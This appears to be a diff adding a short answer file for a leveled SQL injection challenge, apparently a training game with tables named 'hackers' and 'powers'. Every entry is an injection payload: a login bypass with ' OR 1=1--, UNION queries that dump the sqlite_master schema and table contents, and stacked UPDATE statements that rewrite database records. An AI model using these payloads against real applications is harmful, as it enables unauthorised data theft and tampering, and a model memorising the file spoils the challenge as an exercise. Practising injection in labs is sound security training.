@@ -1,0 +1,31 @@
+lvl1:
+' OR 1=1--
+
+
+
+
+lvl2:
+' UNION SELECT name, category FROM products WHERE category = 'admin_items' --
+
+' UNION SELECT name, sql FROM sqlite_master --
+
+
+
+lvl3:
+ByteBard
+'; UPDATE hackers SET power = 'stolen' WHERE name ='ByteBard'--
+
+
+
+lvl4:
+P1:
+' OR 1=1--
+
+
+P2:
+' UNION SELECT name, sql FROM sqlite_master --
+' UNION SELECT power_name, status FROM powers--
+
+
+P3:
+'; UPDATE powers SET status = 'returned' WHERE power_name = 'SQLariusPowers'; --
